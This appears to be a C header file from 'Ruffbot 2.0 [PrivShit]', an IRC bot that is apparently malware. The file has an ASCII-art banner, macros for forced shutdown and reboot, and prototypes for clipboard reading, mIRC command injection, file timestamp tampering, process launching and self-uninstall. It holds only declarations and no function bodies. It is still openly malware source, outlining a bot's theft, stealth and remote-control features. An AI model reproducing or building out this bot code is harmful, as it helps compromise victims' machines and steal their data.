/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
     



        Ruffbot 2.0 [PrivShit] by Ruffnes

*/ 


#define SHTDN_REASON_MAJOR_SYSTEM	0x00050000 // ripped from reason.h
#define SHTDN_REASON_MINOR_HUNG		0x00000005

#define SHUTDOWN_SYSTEM_HUNG		(SHTDN_REASON_MAJOR_SYSTEM|SHTDN_REASON_MINOR_HUNG) // for XP,2k only ignored on 9x
#define EWX_SYSTEM_REBOOT			(EWX_REBOOT | EWX_FORCE)
#define EWX_FORCE_SHUTDOWN			(EWX_SHUTDOWN | EWX_POWEROFF | EWX_FORCE)


//char *replacestr(char *str, char *oldstr, char *newstr);
char *replacestr(char *str, const char *substr, const char *repstr);
int Split(char *inStr, void *saveArray);
void initskip(char *s, int len, int skip[1024]);
int lstrindex(char c);
char *lstrstr(char *s, char *t);
char *PrintError(char *msg);
char *GetClipboardText(void);
BOOL mirccmd(char *cmd);
void SetFileTime(char *Filename);
DWORD CreateProc(char *file, char *param);
BOOL Reboot(void);
void uninstall(void);
